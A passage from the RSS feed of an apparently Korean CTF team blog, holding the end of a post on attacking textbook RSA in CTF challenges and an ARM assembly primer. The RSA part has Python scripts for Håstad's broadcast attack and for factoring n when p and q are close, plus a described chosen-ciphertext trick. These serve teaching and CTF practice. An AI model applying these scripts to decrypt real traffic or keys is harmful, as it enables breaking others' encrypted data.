class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chinese_remainder</span><span class="params">(n, a)</span>:</span></span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    prod = reduce(<span class="keyword">lambda</span> a, b: a*b, n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> n_i, a_i <span class="keyword">in</span> zip(n, a):</span><br><span class="line">        p = prod / n_i</span><br><span class="line">        sum += a_i * mul_inv(p, n_i) * p</span><br><span class="line">    <span class="keyword">return</span> sum % prod</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul_inv</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    b0 = b</span><br><span class="line">    x0, x1 = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">1</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> a &gt; <span class="number">1</span>:</span><br><span class="line">        q = a / b</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">        x0, x1 = x1 - q * x0, x0</span><br><span class="line">    <span class="keyword">if</span> x1 &lt; <span class="number">0</span>: x1 += b0</span><br><span class="line">    <span class="keyword">return</span> x1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_invpow</span><span class="params">(x,n)</span>:</span></span><br><span class="line">    high = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> high ** n &lt; x:</span><br><span class="line">        high *= <span class="number">2</span></span><br><span class="line">    low = high/<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> low &lt; mid <span class="keyword">and</span> mid**n &lt; x:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">elif</span> high &gt; mid <span class="keyword">and</span> mid**n &gt; x:</span><br><span class="line">            high = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">    <span class="keyword">return</span> mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseC</span><span class="params">(argv, index, verbose)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    file = open(argv[index],<span class="string">'r'</span>)</span><br><span class="line">    cmd = <span class="string">' '</span>.join(argv)</span><br><span class="line">    fileInput = <span class="string">''</span>.join(file.readlines()).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'--decimal'</span> <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"## Considered as decimal input"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">        <span class="keyword">return</span> long(fileInput)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'--hex'</span> <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"## Considered as hexadecimal input"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">        <span class="keyword">return</span> long(fileInput,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'--b64'</span> <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"## Considered as base64 input"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">        <span class="keyword">return</span> long(binascii.hexlify(binascii.a2b_base64(fileInput)),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            fileInput = long(fileInput)</span><br><span class="line">            <span class="keyword">if</span> verbose:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"## Guessed as decimal input"</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">            <span class="keyword">return</span> long(fileInput)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">if</span> all(c <span class="keyword">in</span> string.hexdigits <span class="keyword">for</span> c <span class="keyword">in</span> fileInput):</span><br><span class="line">                <span class="keyword">if</span> verbose:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"## Guessed as hexadecimal input"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                <span class="keyword">return</span> long(fileInput,<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> verbose:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"## Guessed as base64 input"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                <span class="keyword">return</span> long(binascii.hexlify(binascii.a2b_base64(fileInput)),<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseN</span><span class="params">(argv,index)</span>:</span></span><br><span class="line">    file = open(argv[index],<span class="string">'r'</span>)</span><br><span class="line">    fileInput = <span class="string">''</span>.join(file.readlines()).strip()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fileInput = long(fileInput)</span><br><span class="line">        <span class="keyword">return</span> fileInput</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">        <span class="keyword">return</span> long(RSA.importKey(fileInput).__getattr__(<span class="string">'n'</span>))</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    e = </span><br><span class="line"></span><br><span class="line">    n1 = </span><br><span class="line">    n2 = </span><br><span class="line">    n3 = </span><br><span class="line"></span><br><span class="line">    c1 = </span><br><span class="line">    c2 = </span><br><span class="line">    c3 = </span><br><span class="line"></span><br><span class="line">    n = [n1,n2,n3]</span><br><span class="line">    a = [c1,c2,c3]</span><br><span class="line"></span><br><span class="line">    result = (chinese_remainder(n, a))</span><br><span class="line">    resultHex = str(hex(find_invpow(result,<span class="number">3</span>)))[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">""</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Decoded Hex :\n"</span>,resultHex</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"---------------------------"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"As Ascii :\n"</span>,resultHex.decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><ul><li><p><strong>선택 암호문 공격</strong></p><ul><li><p><strong>원하는 암호문을 복호화 해주는 경우</strong> 가능한 공격 방법(<strong>단, flag는 복호화해주지 않음</strong>)</p></li><li><p><strong>평문의 곱은 암호문의 곱과 동일</strong>하다는 성질을 이용한다.</p></li><li><p>풀이 방법 (flag를 암호화한 값이 주어지고 암호화, 복호화 기능이 존재한다고 가정)</p><ol><li><p><strong>숫자 2를 암호화</strong> 한다.</p></li><li><p><strong>숫자 2를 암호화한 값과 flag를 암호화한 값을 곱한다.</strong></p></li><li><p>결과 값을 <strong>숫자 2로 나누면 플래그</strong>가 된다.</p></li></ol></li></ul></li></ul><ul><li><p><strong>p, q값이 비슷할 경우 n 값으로 p, q값 구하기</strong></p><ul><li><p>gmpy2 모듈의 <code>next_prime</code> 함수를 이용할 경우 p, q 값이 거의 차이가 나지 않는다.</p></li><li><p>이때 n 값만 주어져도 p, q값을 구할 수 있게 된다.</p></li><li><p>gmpy2의 <code>isqrt</code>와 <code>t_divmod</code>를 이용하면 된다.</p></li><li><p>예시 코드 (n 값과 e 값이 주어졌다고 가정)</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n =</span><br><span class="line">e = </span><br><span class="line">c =</span><br><span class="line"></span><br><span class="line">p = isqrt(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    q, r = t_divmod(n, p)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'%x'</span> % pow(c, d, n)).decode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><hr><h3 id="레퍼런스"><a href="#레퍼런스" class="headerlink" title="레퍼런스"></a>레퍼런스</h3><p><a href="https://blog.naver.com/yjw_sz/221441769257" target="_blank" rel="noopener">https://blog.naver.com/yjw_sz/221441769257</a></p><p><a href="https://blog.naver.com/yjw_sz/221396346574" target="_blank" rel="noopener">https://blog.naver.com/yjw_sz/221396346574</a></p><p><a href="https://xerxes-break.tistory.com/341" target="_blank" rel="noopener">https://xerxes-break.tistory.com/341</a></p><hr><h3 id="문서역사"><a href="#문서역사" class="headerlink" title="문서역사"></a>문서역사</h3><p><code>2019-09-24</code> <strong>JSec: 최초 작성</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/09/24/Crypto/%E3%84%B4%20Research/RSA_for_CTF/#disqus_thread</comments>
    </item>
    
    <item>
      <title>ARM_기초</title>
      <link>https://defenit.kr/2019/09/20/Rev/%E3%84%B4%20Research/ARM_%EA%B8%B0%EC%B4%88/</link>
      <guid>https://defenit.kr/2019/09/20/Rev/%E3%84%B4%20Research/ARM_%EA%B8%B0%EC%B4%88/</guid>
      <pubDate>Fri, 20 Sep 2019 05:12:57 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;목차&quot;&gt;&lt;a href=&quot;#목차&quot; class=&quot;headerlink&quot; title=&quot;목차&quot;&gt;&lt;/a&gt;목차&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;ARM (Advanced Risc Machine)&lt;/li&gt;
&lt;li&gt;Thumb 모드 / ARM 모드&lt;ul&gt;
&lt;li&gt;A
        
      
      </description>
      
      <content:encoded><![CDATA[<h1 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h1><ul><li>ARM (Advanced Risc Machine)</li><li>Thumb 모드 / ARM 모드<ul><li>ARM Instruction</li><li>Thumb Instruction</li></ul></li><li>ARM 레지스터</li><li>ARM Intruction</li><li>ARM Assembly<ul><li>Branch Instruction (분기 명령)</li><li>LDR and STR Instruction (단일 데이터 이동명령)</li><li>LDM and STM Instruction (여러개의 데이터 이동명령)</li></ul></li><li>콜링 컨벤션</li><li>레퍼런스</li><li>문서 역사</li></ul><hr><h3 id="ARM-Advanced-Risc-Machine"><a href="#ARM-Advanced-Risc-Machine" class="headerlink" title="ARM (Advanced Risc Machine)"></a>ARM (Advanced Risc Machine)</h3><p><code>RISC</code>를 사용하는 대표적인 언어중 하나이며 <code>임베디드 장비</code>에 많이 쓰인다.</p><ul><li><p><strong>RISC</strong> (Reduced Instruction Set Computer)</p><ul><li><p>CPU 명령어의 개수를 줄여서 CISC 방식보다 구조를 간단하게 한 것</p></li><li><p>32비트로 명령어의 크기가 동일하다. (고정길이 명령)</p></li><li>대표적으로 <code>arm</code>, <code>mips</code>에서 사용한다.</li></ul></li><li><p><strong>CISC</strong> (Complex Instruction Set Computer)</p><ul><li>명령어의 수가 많고 처리하는 시간이 길어서 대기 시간이 길다.</li><li>대표적으로 <code>x86</code>에서 사용한다.</li></ul></li></ul><p><hr></p><h3 id="Thumb-모드-ARM-모드"><a href="#Thumb-모드-ARM-모드" class="headerlink" title="Thumb 모드 / ARM 모드"></a>Thumb 모드 / ARM 모드</h3><p><strong>ARM에는 두가지의 명령어 체계가 존재</strong>한다. 명령어가 16bit인 것도 있고 32bit인 것도 있다. <strong>32bit 명령어를 <code>ARM Instruction</code></strong> 이라고 하고 <strong>16bit 짜리 명령어를 <code>Thumb Instruction</code></strong> 이라고 한다.</p><p><strong>컴파일러가 <code>CPSR</code>의 5번째 bit인 <code>T flag</code>를 참조해서 ARM 모드인지, Thumb 모드인지 판단</strong>해서 적용시킨다. <strong><code>BX</code> / <code>BLX</code> 명령을 이용해서 모드 전환</strong>이 이루어지며 Branch를 수행한다.</p><ul><li><strong>ARM Instruction</strong><ul><li><strong>처리속도를 우선시</strong> 할 때 사용<ul><li>ARM은 32bit 프로세서이며 16bit 명령어를 처리하기 위해선 처리 과정을 한 번더 거치게 된다. (즉, 효율성이 감소)</li></ul></li></ul></li><li><strong>Thumb Instruction</strong><ul><li><strong>코드 길이를 줄일때</strong> 사용<ul><li>ARM 모드로 작성한 프로그램의 크기의 70%밖에 되지 않는다.</li><li><strong>셸코드를 작성할 때도 당연히 바이트 수를 줄이기 위해 Thumb 모드를 사용</strong>하는게 좋다.</li></ul></li></ul></li></ul><p><hr></p><h3 id="ARM-레지스터"><a href="#ARM-레지스터" class="headerlink" title="ARM 레지스터"></a>ARM 레지스터</h3><ul><li><code>R0 ~ R10</code>: 범용레지스터로서 연산 및 임시 저장 장소 등으로 사용 (<strong>Thumb Mode는 R7까지 사용</strong>)<ul><li><strong>R0</strong>: 함수의 <strong>반환 값</strong>을 저장, 함수의 <strong>첫 번째 인자</strong> 저장</li><li><strong>R1</strong>: 함수의 <strong>두 번째 인자</strong> 저장 </li><li><strong>R2</strong>: 함수의 <strong>세 번째 인자</strong> 저장</li><li><strong>R3</strong>: 함수의 <strong>네 번째 인자</strong> 저장</li><li><strong>R7</strong>: <strong>Thumb mode에서 syscall number</strong>를 저장</li></ul></li><li><code>R11 ~ R15</code>: 특수한 목적으로 사용<ul><li><strong>R13</strong>:  <code>SP</code>(Stack Pointer),  <strong>현재 스택의 최상단의 주소</strong>를 저장</li><li><strong>R14</strong>: <code>LR</code>(Link Register), <strong>복귀 주소</strong>(return address)를 저장</li><li><strong>R15</strong>: <code>PC</code>(Program Counter), <strong>다음 실행할 명령의 주소</strong>를 저장</li></ul></li><li><code>PSR</code>: 상태 레지스터<ul><li><strong>SPSR</strong>: 모드가 변경될 때 마다 변경되기 전의 CPSR을 저장</li><li><strong>CPSR</strong>: <strong>현재 동작중인 프로세서의 상태</strong>를 저장<ul><li><img src="https://user-images.githubusercontent.com/43925259/65316068-33326080-dbd4-11e9-9492-eb2fe8ca2f68.png" alt="1568717584116"><ul><li><strong>N</strong>: 연산 결과가 음수일 경우</li><li><strong>Z</strong>: 연산 결과가 0인 경우</li><li><strong>C</strong>: 연산 결과에서 자리올림이 발생한 경우</li><li><strong>V</strong>: 연산 결과가 overflow가 발생한 경우</li></ul></li></ul></li></ul></li></ul><p><hr></p><h3 id="ARM-Intruction"><a href="#ARM-Intruction" class="headerlink" title="ARM Intruction"></a>ARM Intruction</h3><ul><li><p><strong>Load / Store 구조를 사용</strong></p><ul><li>ARM은 메모리 내의 데이터에 직접 접근이 불가능</li><li><code>LDR</code>, <code>STR</code>과 같은 명령을 통해서 메모리와 레지스터 사이에 데이터를 전송</li></ul></li><li><p><strong>3-Address data Processing</strong></p><ul><li><img src="https://user-images.githubusercontent.com/43925259/65316071-34fc2400-dbd4-11e9-8ce2-2359099cb254.png" alt="1568719174865"></li><li>두 개의 source operand와 result operand를 사용</li><li>result 위치엔 항상 레지스터가 오고 OP 자리엔 레지스터 또는 상수</li></ul></li><li><p><strong>모든 명령어는 조건부 실행 가능</strong></p><ul><li>CPSR 레지스터에 Condition Flag 정보에 맞춰서 분기 (N, Z, C, V)</li><li>ARM의 모든 명령어는 조건필드를 가지고 있고 조건에 따라 실행 여부를 결정<ul><li>Ex) ADD<strong>EQ</strong> r0, r1, r2    ; if Z=1, then r0 = r1 + r2</li></ul></li><li>명령어의 접미사<ul><li><img src="https://user-images.githubusercontent.com/43925259/65315814-b901dc00-dbd3-11e9-9416-5103eb9595a0.png" alt="1568967362291"></li></ul></li></ul><hr></li></ul><h3 id="ARM-Assembly"><a href="#ARM-Assembly" class="headerlink" title="ARM Assembly"></a>ARM Assembly</h3><ul><li><h5 id="Branch-Instruction-분기-명령"><a href="#Branch-Instruction-분기-명령" class="headerlink" title="Branch Instruction (분기 명령)"></a>Branch Instruction (분기 명령)</h5><ul><li><strong><code>B (Branch)</code></strong><ul><li>사용법: <code>B 주소</code></li><li>B 명령어 뒤에 <strong>지정된 주소로 분기</strong>하는 명령</li><li>x86의 <code>jmp</code>와 유사</li></ul></li><li><strong><code>BL (Branch with Link)</code> </strong><ul><li>사용법: <code>BL 주소</code></li><li>BL 명령어 뒤에 <strong>지정된 주소로 분기하되 복귀 주소를 R14에 저장</strong></li><li>x86의 <code>call</code>과 유사</li></ul></li><li><strong><code>BX (Branch indirect)</code></strong><ul><li>사용법: <code>BX 레지스터</code></li><li>BX 명령어 뒤에 <strong>지정된 레지스터로 분기</strong>하는 명령</li></ul></li><li><strong><code>BLX (Branch indirect with Link)</code></strong><ul><li>사용법: <code>BLX 레지스터</code></li><li>BLX 명령어 뒤에 <strong>지정된 레지스터로 분기하되 복귀 주소를 R14에 저장</strong></li></ul></li></ul></li><li><h5 id="LDR-and-STR-Instruction-단일-데이터-이동명령"><a href="#LDR-and-STR-Instruction-단일-데이터-이동명령" class="headerlink" title="LDR and STR Instruction (단일 데이터 이동명령)"></a>LDR and STR Instruction (단일 데이터 이동명령)</h5><ul><li><p><strong><code>LDR (Load register)</code></strong></p><ul><li>사용법: <code>ldr 레지스터, 메모리</code></li><li><strong>메모리에서 4byte 읽어서 레지스터로 복사</strong>하는 명령</li></ul></li><li><p><strong><code>STR (Store register)</code></strong></p><ul><li>사용법: <code>str 레지스터, 메모리</code></li><li><strong>레지스터의 값을 메모리에 4byte 만큼 복사</strong>하는 명령 (<strong>복사 방향 주의</strong>)</li></ul></li><li><p><strong><code>LDR, STR의 접미사</code></strong></p><ul><li><strong>H: 2byte</strong></li><li><strong>B: 1byte</strong></li><li>그냥 사용하면 4byte로 동작하고 <code>LDRH</code>, <code>STRB</code>와 같이 <code>2byte</code>, <code>1byte</code>씩 동작가능</li></ul></li><li><p><code>pre-indexed와 post-indexed</code></p><ul><li><p><strong>pre-indexed</strong></p><ul><li>LDR R0, [R1, #0x8]과 같이 <strong>오프셋이 대괄호안에 들어가있는 경우</strong></li><li><strong>기준 레지스터(예시에서의 R1)로부터 오프셋만큼 떨어진 주소에서 4byte 만큼 복사</strong></li><li><strong>기준 레지스터의 값은 변하지 않음.</strong></li><li><strong>끝에 !를 붙히면 기준 레지스터의 값이 변함.</strong> (LDR R0, [R1, #0x8]!)</li></ul></li><li><p><strong>post-indexed</strong></p><ul><li>LDR R0, [R1], 0x8과 같이 <strong>오프셋이 대괄호밖에 있는 경우</strong></li><li><strong>기준 레지스터(예시에서의 R1)에서 4byte만큼 복사 후 기준 레지스터 값을 오프셋 만큼 변경</strong></li></ul></li></ul></li></ul></li></ul><ul><li><p><strong>LDM and STM Instruction (여러개의 데이터  이동)</strong> </p><ul><li><strong><code>LDM (Load Multiple Register)</code></strong><ul><li>사용법1: <code>LDM??  메모리, {레지스터, 레지스터, ...}</code></li><li>사용법2: <code>LDM?? 메모리, {레지스터-레지스터}</code></li><li><strong>메모리에 있는 값을 레지스터로 복사하는 명령</strong>이다. (<strong>복사 방향 주의</strong>)</li><li>무조건 <strong>워드(32-bit) 단위의 복사만 존재</strong>한다.</li><li>레지스터를 표현할때 쉼표(,)로 쓰면 특정 레지스터를 의미하고 하이픈(-)을 사용하면 연속된 레지스터를 참조하는 것이다. (R1-R3 이라면 R1, R2, R3과 동일)</li></ul></li><li><strong><code>STM (Store Multiple Register)</code></strong><ul><li>사용법1: <code>STM?? 메모리, {레지스터, 레지스터, ...}</code></li><li>사용법2: <code>STM?? 메모리, {레지스터-레지스터}</code></li><li><strong>여러개의 레지스터 값을 메모리로 복사하는 명령</strong>이다. </li><li>마찬가지로 <strong>워드(32-bit) 단위의 복사만 존재</strong>한다.</li></ul></li><li><strong><code>LDM과 STM의 어드레싱 모드</code></strong> (<strong>LDM과 STM의 접미사</strong>)<ul><li><code>IA</code>: 연산 이후 메모리 값(베이스 레지스터)을 한 워드 증가</li><li><code>IB</code>: 연산 이전에 메모리 값을 한 워드 증가</li><li><code>DA</code>: 연산 이후에 메모리 값을 한 워드 감소</li><li><code>DB</code>: 연산 이전에 메모리 값을 한 워드 감소</li></ul></li></ul></li></ul><p><hr></p><h3 id="콜링-컨벤션"><a href="#콜링-컨벤션" class="headerlink" title="콜링 컨벤션"></a>콜링 컨벤션</h3><ul><li><strong><code>R0 ~ R3</code> 까지 순서대로 인자를 저장</strong></li><li><strong>인자가 5개 이상이면 <code>스택</code>을 사용</strong></li><li><strong>함수의 반환 값은 <code>R0</code>을 사용</strong></li><li><strong><code>BL</code> 또는 <code>BLX</code>를 사용할 때 복귀 주소를 <code>R14</code> 레지스터에 저장</strong></li></ul><p><hr></p><h3 id="레퍼런스"><a href="#레퍼런스" class="headerlink" title="레퍼런스"></a>레퍼런스</h3><p><a href="http://blog.daum.net/goldhjw/7406090" target="_blank" rel="noopener">http://blog.daum.net/goldhjw/7406090</a></p><p><a href="http://trace32.com/wiki/index.php/Cortex-M" target="_blank" rel="noopener">http://trace32.com/wiki/index.php/Cortex-M</a></p><p><a href="https://dreamlog.tistory.com/121" target="_blank" rel="noopener">https://dreamlog.tistory.com/121</a></p><p><a href="https://drive.google.com/file/d/0B_sx6nhKufWqRTdZemNETVhxVWM/view" target="_blank" rel="noopener">https://drive.google.com/file/d/0B_sx6nhKufWqRTdZemNETVhxVWM/view</a></p><hr><h3 id="문서-역사"><a href="#문서-역사" class="headerlink" title="문서 역사"></a>문서 역사</h3><p><code>2019-09-20</code>  <strong>JSec: 최초 작성</strong></p><hr><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/09/20/Rev/%E3%84%B4%20Research/ARM_%EA%B8%B0%EC%B4%88/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
